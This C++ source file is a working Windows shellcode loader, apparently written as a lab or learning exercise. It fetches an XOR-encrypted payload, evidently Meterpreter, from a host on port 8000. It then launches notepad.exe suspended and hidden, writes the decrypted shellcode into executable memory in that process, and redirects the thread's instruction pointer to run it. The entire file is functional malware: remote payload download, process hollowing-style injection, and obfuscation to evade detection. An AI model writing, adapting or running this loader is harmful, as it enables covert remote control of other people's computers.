#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wininet.h>
#include <thread>
#include <dbghelp.h>
#pragma comment (lib, "dbghelp.lib")
#pragma comment(lib, "wininet.lib")

//decrypt the shellcode
void xor_encrypt_decrypt(uint8_t* data, size_t data_len, const char* key) {
	size_t key_len = strlen(key);
	for (size_t i = 0; i < data_len; i++) {
		data[i] ^= key[i % key_len];
	}
}

int main() {


	//Open internet session and get the file handle
	HINTERNET hInternet = InternetOpen(L"Updater", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hFile = InternetOpenUrl(hInternet, L"http://192.168.56.111:8000/encrypted_meter.bin", NULL, 0, INTERNET_FLAG_RELOAD, 0);

	DWORD bytesRead;
	BYTE buffer[203850];
	//get the shellcode in buffer
	InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead);

	//create a process in suspended & hidden state
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION	pi = { 0 };

	//hide process window
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	//create the process
	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);


	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pi.dwThreadId);
	if (!hThread) {
		printf("Error open thread.\n");
		return 1;
	}

	// Allocate Shellcode in Memory
	
	LPVOID remoteShellcode = VirtualAllocEx(pi.hProcess, NULL, sizeof(buffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("Memory allocated at: %p\n", remoteShellcode);

	//decrypt the shellcode
	const char key[] = "secret";
	xor_encrypt_decrypt(buffer, sizeof(buffer), key);
	Sleep(3000);
	printf("Now going to write shellcode into this memory\n");

	WriteProcessMemory(pi.hProcess, remoteShellcode, buffer, sizeof(buffer), NULL);
	Sleep(3000);
	printf("shellcode is written!\n");

	printf("Getting context ( registers state ) of thread\n");

	// Get Context Thread
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(hThread, &ctx);   //Retrieves the thread registers (RIP/EIP, RSP, RAX, etc.). 
	//This snapshot is the CPU state at the exact moment you paused the thread.

	//Redirect execution to shellcode
#ifdef _WIN64
	// Redirect the RIP (64 bits) for shellcode, Here, we overwrite RIP with the address where our shellcode lives in the target process.
	ctx.Rip = (DWORD64)remoteShellcode;
#else
	// Redirect the EIP (32 bits) for shellcode
	ctx.Eip = (DWORD)remoteShellcode;
#endif

	printf("thread RIP is going to be changed to our shellcode memory address!\n");
	//update the thread context ( registers)
	SetThreadContext(hThread, &ctx);

	printf("Resuming thread\n");
	Sleep(7000);
	// Resume the thread
	ResumeThread(hThread);
		
	// Clear
	CloseHandle(hThread);
	CloseHandle(pi.hProcess);
	return 0;
}
